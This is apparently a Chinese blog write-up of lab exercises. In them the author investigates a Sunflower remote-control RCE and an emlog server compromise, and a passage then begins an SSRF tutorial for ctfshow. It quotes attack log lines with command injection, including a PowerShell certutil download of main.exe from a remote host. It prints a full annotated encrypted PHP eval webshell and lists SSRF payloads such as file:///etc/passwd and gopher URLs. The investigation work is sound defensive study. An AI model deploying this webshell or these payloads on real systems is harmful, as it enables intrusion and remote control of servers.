0x01前言\n\n好久没做玄机了，终于到Windows的版块了，马上来学习一下，借鉴了师傅的文章\n\nhttps://blog.csdn.net/administratorlws/article/details/140358847?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221236473242d15e44a20a457eac83664d%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=1236473242d15e44a20a457eac83664d&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-140358847-null-null.nonecase&utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&spm=1018.2226.3001.4450\n\n# 0x02正文\n\n## 第四章 windows实战-向日葵\n\n先介绍一下向日葵\n\n### 向日葵远程连接软件\n\n向日葵远程连接软件是一款流行的远程桌面软件，主要用于远程控制和远程协助。它允许用户通过互联网远程访问和控制其他计算机和设备，广泛应用于个人用户、企业技术支持、教育等场景。\n\n#### 向日葵的主要功能\n\n- 远程桌面控制：\n\n\n允许用户通过网络远程控制另一台计算机的桌面，就像操作本地计算机一样。\n\n支持多屏显示、屏幕录像、键盘鼠标控制等功能。\n\n- 远程文件管理：\n\n用户可以在远程计算机之间传输文件，进行文件的上传、下载、删除、重命名等操作。\n\n提供文件夹同步功能，实现两台设备之间的文件自动同步。\n\n- 远程摄像头监控：\n\n可以通过远程查看连接到远程计算机的摄像头，实现远程监控功能。\n\n支持实时视频传输，查看监控画面。\n\n- 远程开关机：\n\n支持通过网络远程启动或关闭计算机，方便进行远程管理。\n\n可以设定定时开关机任务，实现自动化管理。\n\n- 远程协助：\n\n用户可以通过向日葵软件向他人提供远程技术支持和帮助。\n\n支持多人协作，共享屏幕，进行在线会议和培训。\n\n- 跨平台支持：\n\n向日葵支持多种操作系统，包括Windows、macOS、Linux、Android和iOS。\n用户可以通过不同设备进行远程连接和管理。\n\n### 连接靶机\n\n我们先连接我们的靶机，使用本地的远程桌面连接\n\nwin+cmd 并键入**mstsc**\n\n![image-20241202202955618](./../image/achieve/202411/玄机第四章windows实战/image-20241202202955618.png)\n\n### 问题1:通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为多少\n\n解题思路:\n\n题目让我们提交黑客首次攻击成功的时间，那这题既然主要的是“向日葵”，那肯定就是查日志分析了\n\n一开始我是直接看的事件查看器\n\n![image-20241202203603773](./../image/achieve/202411/玄机第四章windows实战/image-20241202203603773.png)\n\n但是没发现什么可用的信息，然后我们去看一下向日葵文件的所在文件位置，从里面看看是否有日志文件可用分析\n\n![image-20241202203900337](./../image/achieve/202411/玄机第四章windows实战/image-20241202203900337.png)\n\n有log文件，跟进分析一下\n\n![image-20241202204010946](./../image/achieve/202411/玄机第四章windows实战/image-20241202204010946.png)\n\n因为我们要找的是黑客首次攻击成功的时间，所以我们从最早的文件打开看看\n\n那打开日志，我们就主要分析以下特征，从而缩小范围进行查找；\n\n特征\n\n- 异常登录记录：\n\n\n登录记录从未知或可疑IP地址。\n\n非常规时间段内的登录行为。\n\n- 频繁连接请求：\n\n短时间内的多次连接尝试，尤其是从相同IP地址。\n\n- 失败登录尝试：\n\n多次失败登录尝试，可能表示暴力破解尝试。\n\n- 新设备注册：\n\n是否有新设备绑定到你的向日葵账户。\n\n- 高频操作记录：\n\n短时间内的高频率操作记录。\n然后翻日志发现了这个\n\n![image-20241202204636644](./../image/achieve/202411/玄机第四章windows实战/image-20241202204636644.png)\n\n1.这个时间段里有进行过多次的连接尝试，从同一IP地址（192.168.31.45）到目标IP地址（192.168.31.114）\n\n```php\n2024-03-21 19:54:46.097\t- Info  -\t[service][TcpAcceptor] new acceptor 192.168.31.45:63976-->192.168.31.114:49724\n2024-03-21 19:54:53.054\t- Info  -\t[service][TcpAcceptor] new acceptor 192.168.31.45:57945-->192.168.31.114:49724\n2024-03-21 19:54:56.066\t- Info  -\t[service][TcpAcceptor] new acceptor 192.168.31.45:58485-->192.168.31.114:49724\n```\n\n这里的日志记录，可以看出确实是黑客的在进行攻击尝试。这些日志显示了多个HTTP连接尝试，每个连接尝试都有不同的路径和参数，这些路径和参数是漏洞利用或恶意扫描。\n\n2.**可疑的HTTP路径和参数**\n\n每个连接尝试的路径和参数都显示了对特定资源的访问，这些资源路径和参数是已知漏洞利用的路径。例如：\n\n- /pages/createpage-entervariables.action?SpaceKey=x:\n\n\n1.描述：这个请求看起来像是针对某个网页应用框架的攻击尝试，可能是针对 Confluence 的命令注入。\n\n2.参数：\n\nSpaceKey=x：攻击者尝试通过设置某个参数来利用该漏洞。\n\n3.目标：通过设置不安全的参数值，可能会导致服务器执行恶意代码或命令。\n\n- /CFIDE/administrator/enter.cfm?locale=…/…/…/…/…/…/…/lib/password.properties%00en:\n\n1.描述：这是一个目录遍历攻击，它试图通过操纵路径来访问敏感文件。\n\n2.参数：\n\nlocale=../../../../../../../lib/password.properties%00en：攻击者使用了目录遍历 (../../../../../../../) 和空字符 (%00) 来访问本不应公开的 password.properties 文件。\n\n3.目标：读取或修改配置文件，可能包含敏感信息如密码。\n\n- /mailsms/s?func=ADMIN\n\n&dumpConfig=/:\n\n1.描述：这个请求试图利用一个功能（可能是一个管理功能）来获取系统配置信息。\n\n2.参数：\n\nfunc=ADMIN:appState&dumpConfig=/：这个参数组合看起来像是试图调用一个管理命令 (ADMIN:appState) 并将配置信息导出。\n\n3.目标：获取系统配置和状态信息，可能包括敏感数据。\n\n- /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd\n\n这里的话就是尝试进行rce的操作，试图使用cat查看我们的本地文件\n\n所以这几个url分析下来就是黑客在尝试利用**CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞。**\n\n那什么是**CNVD-2022-10207：向日葵远程控制软件 RCE 漏洞**呢?\n\n- 漏洞背景\n\n\nCNVD-2022-10207 是一个被发现的安全漏洞，允许未经授权的攻击者远程执行任意命令。\n\n- 漏洞成因\n\n\n该漏洞的成因通常涉及以下几个方面：\n\n1. 输入验证缺陷：软件在处理用户输入时，未能正确验证和过滤特定的输入数据。\n\n2. 路径处理不当：软件在处理文件路径时，可能存在目录遍历漏洞，允许攻击者访问任意文件。\n3. 功能滥用：某些管理功能未受到足够的保护，可以被远程调用，执行敏感操作。\n\n- 攻击过程\n\n1. 发送特制请求：攻击者构造特定的 HTTP 请求，利用软件的输入验证缺陷或路径处理不当。\n\n2. 远程执行命令：通过特制请求，攻击者可以执行任意系统命令或脚本。\n3. 获取权限：成功利用漏洞后，攻击者可能获得系统的控制权，执行进一步的恶意操作。\n\n- 影响\n\n1. 远程命令执行：攻击者可以在目标系统上执行任意命令，导致系统被完全控制。\n2. 数据泄露：攻击者可以访问和窃取系统中的敏感数据。\n3. 进一步渗透：攻击者可以利用被控制的系统作为跳板，攻击网络内的其他设备。\n\n所以从这里看的话其实只是黑客的一次次尝试利用漏洞进行攻击，但是并没有攻击成功，所以我们还需要继续分析日志文件\n\n终于在最底下发现了一些奇怪的地方\n\n![image-20241202210129658](./../image/achieve/202411/玄机第四章windows实战/image-20241202210129658.png)\n\n简单分析一下这里\n\n首先是\n\n```\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+pwd\n```\n\n这里的命令表明黑客在通过路径遍历去访问并执行powershell命令，这些命令的目的是验证是否能够成功执行系统命令。`whoami`命令用于查看当前执行命令的用户，`pwd`命令用于查看当前工作目录。\n\n日志中多次记录了从攻击者IP（192.168.31.45）到目标IP（192.168.31.114）的HTTP连接，表明攻击者正在反复尝试连接和执行命令。\n\n所以这里的话可用想到应该是黑客攻击成功了然后在进行测试执行命令是否正常，以确认权限级别和工作目录\n\n**日志记录表明，攻击者在2024年3月26日10:16:25通过路径遍历和命令注入成功执行了PowerShell命令。**\n\n### 问题2:通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少\n\n这个的话我们刚刚一直都可以看到日志文件中有一个经常出现的ip地址，就可能是黑客攻击的ip，也就是192.168.31.45\n\n### 问题3:通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为\n\n这个的话是需要找到托管恶意程序的ip，我们还是需要继续分析日志文件，然后往下翻又看到了别的\n\n![image-20241202211458248](./../image/achieve/202411/玄机第四章windows实战/image-20241202211458248.png)\n\n\n\n这里的话我们也分析一下\n\n```php\n2024-03-26 10:31:07.538\t- Info  -\t[service][TcpAcceptor] new acceptor 192.168.31.45:49328-->192.168.31.114:49724\n#从IP 192.168.31.45 发起了到IP 192.168.31.114 的新连接\n2024-03-26 10:31:07.538\t- Info  -\t[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49328, path: /cgi-bin/rpc?action=verify-haras, version: HTTP/1.1\n#尝试访问路径 /cgi-bin/rpc?action=verify-haras\n2024-03-26 10:31:07.538\t- Info  -\t[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49328,/cgi-bin/rpc?action=verify-haras, plugin:cgi-bin, session:\n2024-03-26 10:31:07.576\t- Info  -\t[service][TcpAcceptor] new acceptor 192.168.31.45:49329-->192.168.31.114:49724\n2024-03-26 10:31:07.576\t- Info  -\t[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329, path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, version: HTTP/1.1\n#访问的路径为 /check?cmd=ping...，其中包含了一个可能的命令注入尝试，且连接尝试执行 powershell.exe 和 certutil 的组合命令\n2024-03-26 10:31:07.576\t- Info  -\t[Acceptor][HTTP] new RC HTTP connection 192.168.31.45:49329,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe, plugin:check, session:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1\n```\n\n这里的话关键点在于\n\n- 恶意行为：\n\n\n1. 路径遍历：/check?cmd=ping.... 是一种路径遍历尝试，试图访问系统中的powershell.exe。\n\n2. 命令执行：使用 certutil 工具下载文件 main.exe。路径是 http://192.168.31.249/main.exe，这里的话可能是从外部服务器下载恶意文件，可能指向一个可能托管恶意程序的外部服务器。\n\n这些日志条目显示了黑客尝试利用路径遍历和命令注入漏洞，通过 `certutil` 从外部服务器（192.168.31.249）下载并执行恶意程序 `main.exe`。这表明黑客的攻击成功了，且试图在目标系统上下载并运行恶意软件。\n\n所以这个192.168.31.249可能就是黑客用于下载恶意程序的ip，我们直接交flag就行\n\n### 问题4:找到黑客解密 DEC 文件\n\n题目让我们提交黑客解密的DEC文件的md5值，那我们先了解一下什么样的是DEC文件\n\nDEC文件：DEC文件通常是与某些特定软件或硬件相关的数据文件，可能包含特定格式的数据。 .dec 文件**定义了公开的数据和接口，供其他模块使用**。\n\n然后我们先在日志文件里搜索一下DEC文件看看有没有什么收获\n\n![image-20241202212513158](./../image/achieve/202411/玄机第四章windows实战/image-20241202212513158.png)\n\n好吧什么都没找到，那就老老实实的分析日志文件吧\n\n![image-20241202212626252](./../image/achieve/202411/玄机第四章windows实战/image-20241202212626252.png)\n\n在这里发现了一个qq.txt文件，前面是647224830\n\nQQ搜索发现是玄机的官方群，但是一群满了，在二群的群文件里面找到了一个DEC文件\n\n![image-20241202212839578](./../image/achieve/202411/玄机第四章windows实战/image-20241202212839578.png)\n\n下载下来是一个DEC.pem，这个应该就是我们想要的文件名，拿去md5加密然后交flag就可以了\n\n### 问题5:通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;\n\n![image-20241202213122277](./../image/achieve/202411/玄机第四章windows实战/image-20241202213122277.png)\n\n桌面上可以看到有两个文件，分别用记事本打开\n\n![image-20241202213250339](./../image/achieve/202411/玄机第四章windows实战/image-20241202213250339.png)\n\n一开始并没有看出来什么，但是想到刚刚的dec文件，发现是RSA解密，那就直接用在线解密去做就行\n\n![image-20241202213456122](./../image/achieve/202411/玄机第四章windows实战/image-20241202213456122.png)\n\n解密结果\n\n![](./../image/achieve/202411/玄机第四章windows实战/QQ20241121-201005.png)\n\n然后是AES解密\n\n![image-20241202214607706](./../image/achieve/202411/玄机第四章windows实战/image-20241202214607706.png)\n\n就可以拿到flag了\n\n## 第四章 windows实战-emlog\n\n参考师傅的文章:\n\nhttps://blog.csdn.net/administratorlws/article/details/140125250?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522177e608dfc6e06a4223b92d0810c0900%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=177e608dfc6e06a4223b92d0810c0900&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-140125250-null-null.nonecase&utm_term=%E7%AC%AC%E5%9B%9B%E7%AB%A0&spm=1018.2226.3001.4450\n\n首先我们要了解什么是emlog\n\n### 什么是emlog？\n\nEmlog 是一个开源的博客系统，采用 PHP 和 MySQL 开发，旨在帮助用户轻松创建和管理博客，Emlog 的设计理念是简洁、高效和轻量，适合个人用户和小型网站。\n\n### emlog的特点\n\n1. **简洁易用**\n\nEmlog 的用户界面设计简洁，易于理解和使用，即使对于初学者也能快速上手。用户可以通过后台管理面板轻松发布和管理文章。\n\n2. **多种主题和插件**\n\nEmlog 允许用户自定义自己的博客外观和功能。用户可以选择不同的主题以及安装各种插件，以增强博客的功能性和美观性。\n\n3. **SEO 友好**\n\nEmlog 提供了一些内置的 SEO 功能，帮助用户优化网站，以提高搜索引擎排名。这些功能包括自定义 URL、元标签设置等。\n\n4. **多用户支持**\n\nEmlog 支持多用户管理，允许多个用户在同一个博客上发布文章，并可以设置不同的权限和角色。\n\n5. **灵活的文章管理**\n\n用户可以方便地管理文章，包括分类、标签、评论等。Emlog 还支持草稿功能，用户可以在发布前保存未完成的文章。\n\n6. **数据备份与恢复**\n\nEmlog 提供了数据备份和恢复的功能，用户可以定期备份自己的博客数据，防止数据丢失。\n\n7. **社区支持**\n\n作为一个开源项目，Emlog 拥有活跃的开发者社区和用户群体，用户可以在社区论坛寻求帮助、分享经验和获取资源。\n\n### 应用场景\n\n- 个人博客\n\n\nEmlog 适合个人用户创建和管理博客，记录日常生活和思想。\n\n- 小型网站\n\n由于其轻量级和高效性，Emlog 也适合用于创建小型企业网站或作品展示网站。\n\n- 自媒体平台\n\n自媒体从业者可以使用 Emlog 搭建个人博客平台，发布和管理内容，建立个人品牌。\n\n由于其低门槛和灵活性，适合不具备深厚技术背景的用户使用。\n\n### 连接靶机\n\n前面讲过了，步骤是一样的，不会的可以返回去看一下\n\n### 问题1:通过本地 PC RDP到服务器并且找到黑客植入 shell,,将黑客植入 shell 的密码提交\n\n简单来说就是找shell嘛，前面的章节里面也有关于查杀webshell的方法，这里的话我们还是先找一下切入点\n\n简单扫一眼，桌面上发现“PHPStudy”，PHPStudy是一款集成了 PHP、Apache、MySQL、Nginx 等常用 Web 开发环境的本地集成开发环境工具。简单来说就是用来搭建网站的，既然是搭建网站的，那黑客肯定会从这边下手\n\n那我们先打开phpstudy的文件所在文件夹\n\n![image-20241203151326710](./../image/achieve/202411/玄机第四章windows实战/image-20241203151326710.png)\n\n不过这个目录的话不算是phpstudy的目录，我们返回上一级\n\n![image-20241203151434007](./../image/achieve/202411/玄机第四章windows实战/image-20241203151434007.png)\n\n这里可以看到有两个www的文件夹，这里的www文件夹代表着什么呢？在 PHPStudy Pro 中，WWW 目录通常是存放 Web 项目的根目录。这个目录是 Apache 或 Nginx 等 Web 服务器的默认站点目录，所有的 Web 项目文件和代码都会放在这个目录中。\n\n**总之，WWW 目录是 PHPStudy Pro 中存放所有 Web 项目文件的地方，是开发和测试 Web 应用的核心目录。**\n\n这里的话手动排查比较麻烦，我们直接上科技，用D盾进行查杀webshell\n\n我们把里面的WWW文件拖出来放到我们本地桌面，接着使用D盾进行扫描WWW目录；\n\n一开始没扫出来以为是我文件复制出问题了，后来发现是电脑的实时保护没开，系统自动把木马文件杀了\n\n![image-20241203153140327](./../image/achieve/202411/玄机第四章windows实战/image-20241203153140327.png)\n\n\n\n直接就看到目录了，我们跟着目录进去看一下这个shell.php文件\n\n![image-20241203153223296](./../image/achieve/202411/玄机第四章windows实战/image-20241203153223296.png)\n\n然后就可以看到shell的连接密码，应该就是我们题目中想要的东西了\n\n但是我们还是来分析一下这个shell文件\n\n**这是一个典型的后门程序（backdoor shell），包含了一些隐蔽和加密的特性。**\n\n```php\n<?php\n@error_reporting(0);#关闭错误报告\nsession_start();#启动新会话\n    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t$_SESSION['k']=$key;#将密钥存储在会话变量中。\n\tsession_write_close();#写入会话数据并关闭会话存储\n\t$post=file_get_contents(\"php://input\");#从请求的原始输入中读取数据，通常用于POST请求。\n\tif(!extension_loaded('openssl'))#检查是否加载了OpenSSL扩展\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}#如果没有，则使用基于字符异或的自定义解密方法；如果有，则使用OpenSSL的AES解密。\n    $arr=explode('|',$post);#将解密后的数据用 | 分割成一个数组，第一个元素是函数名，第二个元素是参数。\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}#这个类定义了一个魔术方法 __invoke，它接受一个参数 $p 并执行 eval($p.\"\");。\n    @call_user_func(new C(),$params);# 调用类 C 的实例，并将参数 $params 传递给它\n?>\n```\n\n这段代码实际上是一个加密的后门程序。它通过接收加密的数据，然后解密并执行其中的 PHP 代码。这使得攻击者可以通过发送特定的加密请求来执行任意的 PHP 代码，从而完全控制服务器。\n\n主要危险点包括：\n\n- 使用 eval 函数执行任意 PHP 代码。\n\n- 通过加密隐藏恶意代码，难以被普通的扫描工具检测到。\n- 利用会话和加密机制，使得攻击通信难以被识别和拦截。\n\n这种后门程序常用于网络攻击中的持久访问，通过隐蔽手段保持对受感染服务器的控制。\n\n### 问题2:通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;\n\n又回到分析ip了，那就又得去分析我们的日志文件了，那我们找一下phpstudy存放日志的文件目录\n\n![image-20241203154041711](./../image/achieve/202411/玄机第四章windows实战/image-20241203154041711.png)\n\n在Extensions目录下，有Apache和Nginx的日志文件，但是我们这里的话是分析Apache日志文件哈，因为Nginx日志文件的大小都是0，也就是空的，所以我们就没必要看了\n\n![image-20241203154220409](./../image/achieve/202411/玄机第四章windows实战/image-20241203154220409.png)\n\n然后我们来看Apache的日志文件，在logs路径下\n\n![image-20241203154318690](./../image/achieve/202411/玄机第四章windows实战/image-20241203154318690.png)\n\n可以看到有很多文件都是空的，且有一个access.log文件的大小是很大的，初步确定是在这个文件里面,然后我们打开进行日志分析\n\n因为之前我们确定了植入shell的文件叫shell.php，所以我直接搜索shell.php文件有没有被利用的痕迹\n\n![image-20241203154705984](./../image/achieve/202411/玄机第四章windows实战/image-20241203154705984.png)\n\n确实存在哈，那我们跟进分析\n\n```plain\n192.168.126.1 - - [26/Feb/2024:22:46:23 +0800] \"GET /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:46:35 +0800] \"GET /content/plugins/tips/shell.php?888666=619 HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:47:54 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:47:54 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:48:47 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n\n192.168.126.1 - - [26/Feb/2024:22:49:58 +0800] \"GET /content/plugins/tips/shell.php?nzQbavYgN6ODoxF1=G65ASv8y3UvkREqS1BhtN8ZQ9rBOTuYm&YD2ZXadPSvHEOYc2=Mtp8qcxNdDLrUSDD7WH6NZB9LGuhPYLT&888666=7Sn1K3PXNdf2Fh0LymWfQDymalxp4ty1&Y0fAQLYotO6P9ZRM=dj3DhH6k3adKnymgE07L8YUSXjdkX4vx&pV8lXaCzdJhmssdK=V4VdNXaxzvxXLdkEB9DTv7Bqbg3qw92J HTTP/1.1\" 200 -\n24:22:50:33 +0800] \"GET /content/plugins/tips/shell.php?AMKhtlTTEMKCZN5T=VbN2ItDmt0cZsJ8nFYFjPG8JpJHhNyqg&NQxMQd88ByKdwKQF=5vlwUtyYSChArIsZ3ajO6Jxzx7vRJuHl&888666=XSXMdgEcy5mYZOn9L4RoWLbwYo9nTxgr&htdk7suOo2SdXKmV=10I1HotZgl6Y50OMPTZRfKOMV1oVbQky&pp4TqWAlQHyYQdb1=rFVrQrbQT3VMlwPZxrnKVOekDCUcVeiX HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:51:58 +0800] \"GET /content/plugins/tips/shell.php?888666=395 HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] \"POST /content/plugins/tips/shell.php HTTP/1.1\" 200 -\n192.168.126.1 - - [26/Feb/2024:22:52:17 +0800] \"GET /content/plugins/tips/shell.php?888666=331 HTTP/1.1\" 200 -\n```\n\n这里不难看出，黑客对植入的shell.php有过多次的请求访问，基于上面对shell.php的分析，这说明黑客可能在利用这个shell去进行远程代码执行或文件操作，这是一种典型的webshell攻击，所以这里的话应是黑客攻击成功了对shell进行利用并对我们的靶机进行了一定的攻击操作，那前面的ip就是黑客的ip\n\n### 问题3：通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;\n\n这里让我们去找黑客的隐藏账户名称，既然说用户名称了，那肯定就是查靶机的用户组了呗（window应急的基础操作），“本地用户和组”是在“计算机管理”里面，想找到“计算机管理”其实也简单，直接在搜索栏搜索即可；\n\n![image-20241203155436176](./../image/achieve/202411/玄机第四章windows实战/image-20241203155436176.png)\n\n或者我们在c盘的用户里面也可以进行查找\n\n![image-20241203155514683](./../image/achieve/202411/玄机第四章windows实战/image-20241203155514683.png)\n\n**当然，也可以直接使用“net user”进行查询计算机的所有用户，但是这里好像隐藏了，并没有发现；**\n\n![image-20241203160143326](./../image/achieve/202411/玄机第四章windows实战/image-20241203160143326.png)\n\nflag{hacker138}\n\n### 问题4:通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;\n\n既然我们知道了黑客的隐藏账户，那我们跟进分析\n\n![image-20241203160456107](./../image/achieve/202411/玄机第四章windows实战/image-20241203160456107.png)\n\n![image-20241203160506963](./../image/achieve/202411/玄机第四章windows实战/image-20241203160506963.png)\n\n然后在桌面找到了一个kuang的应用程序，**那如何找到矿的域池名呢？**\n\n既然现在已经知道挖矿程序了（kuang.exe），那我们直接使用脚本工具“pyinstxtractor.py”把kuang.exe转换成pyc文件，接着随便找一个pyc在线反编译即可发现池域名\n\n我们将kuang程序放到我们的**脚本工具“pyinstxtractor”目录下；**\n\n**![image-20241203160847501](./../image/achieve/202411/玄机第四章windows实战/image-20241203160847501.png)**\n\n然后在当前目录下的终端去运行脚本\n\n```\npython pyinstxtractor.py Kuang.exe\n```\n\n![image-20241203160953764](./../image/achieve/202411/玄机第四章windows实战/image-20241203160953764.png)\n\n然后我们进入这个文件，找到我们想要的pyc文件\n\n![image-20241203161111521](./../image/achieve/202411/玄机第四章windows实战/image-20241203161111521.png)\n\n然后放到在线pyc反编译的网站进行反编译\n\nhttps://tool.lu/pyc/\n\n![image-20241203161519487](./../image/achieve/202411/玄机第四章windows实战/image-20241203161519487.png)\n\n然后就可以看到我们想要的域名\n\n所以最后\n\n```\nflag{wakuang.zhigongshanfang.top}\n```\n\n## 第四章-windows日志分析\n\n\n\n\n\n","tags":["玄机第四章windows实战"],"categories":["玄机"]},{"title":"web入门SSRF篇--ctfshow","url":"/2024/11/30/web入门SSRF篇--ctfshow/","content":"\n## 4.危害\n\n1.  对外网、服务器所在内网、本地进行端口扫描 \n2.  向内部任意主机的任意端口发送payload来攻击内网服务 \n3.  DOS攻击（请求大文件，始终保持连接Keep-Alive Always） \n4.  攻击内网的web应用，如直接SQL注入、XSS攻击等 \n5.  利用file、gopher、dict协议读取本地文件、执行命令等 \n6.  可以无视网站CDN\n\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了方便运维并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n\n## 5.检测漏洞\n\n1.因为SSRF是构造服务器发送请求的漏洞，所以我们可以通过抓包分析发送的请求是否是服务器端发来的请求来判断是否存在SSRF漏洞\n\n2.也可以在页面源码中查找是否存在可以访问的资源地址，如果有一个资源地址的类型为[http://www.xxx.com/a.php?image=](http://www.xxx.com/a.php?image=)地址，就可能存在SSRF漏洞\n\n## 6.示例\n\n假如我们有一个网站可以加载远程地址的内容到本地，并且系统没有对我们传入的url参数进行任何的检查，我们就可以构造其他的请求，例如：\n\n```\nhttp://www.xxx.com/article.php?url=http://127.0.0.1:22\nhttp://www.xxx.com/article.php?url=file:///etc/passwd#访问本地系统中的/etc/passwd文件\nhttp://www.xxx.com/article.php?url=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)\nhttp://www.xxx.com/article.php?url=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)\n..\n```\n\n`file://`协议用于访问本地文件系统，而`/etc/passwd`文件通常存储着系统用户的信息\n\n## 7.相关的函数和类\n\n![image-20241201204741829](./../image/achieve/202411/SSRF/image-20241201204741829.png)\n\n## 8.相关的伪协议\n\n- file 协议结合目录遍历读取文件。\n- gopher 协议打开端口。\n- dict 协议主要用于结合 curl 攻击。\n- http 协议进行内网探测。\n\n# 0x02刷题\n\n## web351\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n```\n\n因为是新的章节，所以我们先来分析一下这段代码\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);#这行代码初始化了一个cURL会话，并将要访问的URL传递给它。\ncurl_setopt($ch, CURLOPT_HEADER, 0);#设置了cURL选项，告诉cURL不要包含响应头部信息。\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);#设置了cURL选项，告诉cURL将响应内容以字符串形式返回，而不是直接输出到浏览器，参数为1表示$result,为0表示echo $result\n$result=curl_exec($ch);#执行cURL会话，发送请求并获取响应内容，将其存储在$result变量中。\ncurl_close($ch);#关闭cURL会话，释放资源。\necho ($result);\n?>\n```\n\n总的来说，这段代码的功能是接收一个远程URL，使用cURL库访问该URL，并将获取到的内容直接输出到浏览器\n\n，结合我们上面说的知识点，这里的话可能就会存在ssrf漏洞，为什么呢?因为他可以向别的地址发起访问申请，我们可以抓包分析一下\n\n![image-20241130111133577](./../image/achieve/202411/SSRF/image-20241130111133577.png)\n\n我们分析一下这个请求包的内容\n\n```php\nSec-Fetch-Site: same-origin#用于指示请求的来源，此处的 same-origin 表示请求来自于同源页面\nSec-Fetch-Mode: navigate#指示了请求的模式。navigate 表示这是一个导航请求，即用户在浏览器中输入URL或点击链接导致的请求。\nSec-Fetch-User: ?1#表示用户是如何触发此请求的\nSec-Fetch-Dest: document#指示了请求的目标资源类型\n```\n\n那这道题该怎么去做呢?\n\n首先我们是可以知道这里是有一个flag.php的，我们先访问看看\n\n![image-20241201110550038](./../image/achieve/202411/SSRF/image-20241201110550038.png)\n\n发现这里是非本地用户无法访问的，所以我们就可以发现这个flag.php的话可能是存在本地也就是我们访问不到的，那我们得通过这个当前的服务器去访问我们的本地服务器，就可以拿到flag了\n\n![image-20241201110833495](./../image/achieve/202411/SSRF/image-20241201110833495.png)\n\n这里的话就通过这个ssrf去构造服务器请求，去带出我们本地服务器中的flag.php文件\n\n当然我们也可以用file协议去读取我们本地的文件\n\nfile:///etc/passwd 有返回值,猜测flag在当前目录，而当前目录一般都是/var/www/html 故传入file:///var/www/html/flag.php\n\n## web352\n\n### 